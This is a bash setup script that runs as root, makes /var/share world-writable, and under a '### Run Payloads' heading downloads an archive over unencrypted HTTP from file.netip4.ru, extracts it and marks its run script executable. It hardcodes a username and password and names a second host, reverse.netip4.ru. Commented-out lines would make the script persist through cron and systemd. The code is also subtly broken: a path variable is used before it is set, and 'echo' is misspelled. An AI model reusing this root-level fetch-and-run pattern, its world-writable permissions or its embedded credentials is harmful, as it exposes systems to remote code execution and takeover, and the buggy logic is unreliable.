#!/usr/bin/env bash
###########################################################
# tinysend.scripts.setup.sh
# This Script will Setup a tinysend Packets
#
###########################################################

# Set a Variables

### Set Metadata ###
#

PACKAGES_DIR=packages
DISTRIB=UBUNTU
PRODUCTNAME=BHSH
SUBPRODUCTNAME=tinysend.scripts
FIRM_NAME=NIT

#### Set Execution Folder
##
QUINTLYDIR=/etc/cron.$FIRM_NAME.quint
QUARTERDIR=/etc/cron.$FIRM_NAME.quart
HALFDIR=/etc/cron.$FIRM_NAME.half
REBOOTDIR=/etc/cron.$FIRM_NAME.rebootdir
CRONKILL=/etc/crontab.$FIRM_NAME.killfile.sh
CRONLOADFILE=crontab.$FIRM_NAME.loadfile.sh
CRONKILLFILE=crontab.$FIRM_NAME.killfile.sh
DAYLYDIR=/etc/cron.$FIRM_NAME.dayly
SOURCENAME=crontab.$FIRM_NAME.source

### Set User Variables
#
anArchive=$SUBPRODUCTNAME.tar.gz

# Initialization Download Variables
#
http_pref001=http
http_host001=file.netip4.ru
http_port001=80
http_dir0001=/LINUXSCRIPTS/
http_dir0002=/ExponentaForDebian/
http_dir0003=$http_dir0001$DISTRIB/$FIRM_NAME/$PRODUCTNAME/$SUBPRODUCTNAME/
http_pref002=http
http_host002=reverse.netip4.ru
http_port002=80
http_dir00000=/tmp/LinFiles/
http_dir00001=/tmp/LinFiles/ComFiles/
http_user001=MSSQLSR
http_pass001=Admin01234

# Derivatives Variables
host=$http_pref001://$http_host001:$http_port001$http_dir0003$anArchive
echo "host = $host"
#

# Check if script run at root mode
#

if [ ! -e /usr/bin/id ]; then
    echo "/usr/bin/id is not found."
    echo "The Packet coreutils may be corrupt!"
    echo "Please check error and reinstall your distributive."
    exit 1
fi

if [ "$(id -u)" -ne 0 ]; then
	echo "ERROR: process must be start with root permissions"
	exit 17
fi

### Set an NIT Users Variable ###
#

echo "### Check System Integrity ###"
###
if [ ! -e /usr/bin/apt-get ]; then
    echo "/usr/bin/apt-get is not found"
    exit 1
fi

### Check a Shared Directory ###
#
if [ ! -d /var ]; then
    echo "Directory /var is not found"
    exit 1
fi

if [ ! -d /var/share ]; then
    mkdir /var/share
fi

if [ ! -d /var/share/tmp ]; then
    mkdir /var/share/tmp
fi

# Set Local File...
localfile=$TPDL/$anArchive
echo "Local File = $localfile"

chown -v -R root:root /var/share
chmod -v 0777 /var/share
find /var/share -type d -exec sudo chmod 0777 {} \;
find /var/share -type f -exec sudo chmod 0666 {} \;
find /var/share -type f -name '*.sh' -exec sudo chmod 0777 {} \;
find /var/share -type f -name '*.bin' -exec sudo chmod 0777 {} \;

TPDL=/var/share/tmp
if [ ! -d $TPDL ]; then
    echo "Directory $TPDL is not found!"
    exit 1
fi
echo "Local Folder = $TPDL"

### Set None Interactive Variable
export DEBIAN_FRONTEND=noninteractive

echo "Main Update and Upgrade..."
echo "##"
apt-get update

echo " "
echo "curl and wget reinstall..."
apt-get install -y curl
apt-get install -y wget

echo " "
echo "shell reinstall..."
apt-get install -y bash

### Run Payloads

# Download an Archive
#
if [ ! -f $localfile ]; then
    curl -o $localfile $host
fi

# Extract Archive
#
tar -xzvf $localfile -C $TPDL

# AutoRun Scripts...
#
chmod -R -v 0777 $TPDL/$SUBPRODUCTNAME/tinysend.TinySendRun.sh
serviceFile=$TPDL/$SUBPRODUCTNAME/tinysend.service

# if [ -d $REBOOTDIR ]; then
#    cp $TPDL/$SUBPRODUCTNAME/tinysend.TinySendRun.sh $REBOOTDIR/TinySendRun_sh
#fi

#if [ -d /etc/systemd/system ]; then
#    ech0 "Copy $serviceFile..."
#    if [ -f $serviceFile ]; then
#        cp $serviceFile /etc/systemd/system/tinysend.service
#        systemctl daemon-reload
#        systemctl enable --now tinysend.service
#    fi
#fi